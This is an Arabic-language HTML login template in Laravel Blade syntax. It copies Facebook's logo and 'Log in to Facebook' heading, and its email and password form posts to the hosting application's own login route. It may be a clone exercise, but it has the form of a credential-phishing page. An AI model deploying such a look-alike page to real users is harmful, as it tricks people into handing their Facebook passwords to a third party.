<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <link rel="stylesheet" href="style_login.css">
</head>
<body>

    <div class="login-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        <h2>تسجيل الدخول إلى فيسبوك</h2>
        <form action="{{ route('login') }}" method="post">
            @csrf
            <input type="text" name="email" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit" class="login-btn">تسجيل الدخول</button>
        </form>
        <div class="forgot-password">
            <a href="#">هل نسيت كلمة المرور؟</a>
        </div>
        <div class="create-account">
            <span>ليس لديك حساب؟ <a href="{{ route('register') }}">إنشاء حساب جديد</a></span>
        </div>
    </div>

</body>
</html>
